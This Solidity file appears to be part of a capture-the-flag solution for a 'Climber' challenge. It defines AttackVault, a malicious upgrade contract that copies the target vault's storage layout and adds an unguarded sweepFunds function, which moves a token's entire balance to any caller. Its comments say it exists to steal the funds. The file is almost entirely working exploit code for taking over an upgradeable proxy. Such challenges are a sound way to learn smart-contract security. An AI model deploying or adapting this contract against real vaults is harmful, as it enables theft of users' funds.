// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";

// We need to keep the variables and the _authorizeUpgrade() function
// We also need a new sweepFunds function to steal the funds, the rest can go
contract AttackVault is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    //We need to keep the same storage layout
    uint256 public constant WITHDRAWAL_LIMIT = 1 ether;
    uint256 public constant WAITING_PERIOD = 15 days;
    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    //remove modifier
    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    //We have to keep this function implementation from UUPSUpgradeable
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}
}
